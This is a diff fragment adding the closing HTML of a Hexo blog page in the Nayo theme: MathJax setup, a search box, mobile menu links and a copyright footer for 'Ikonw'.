+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+</div>
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
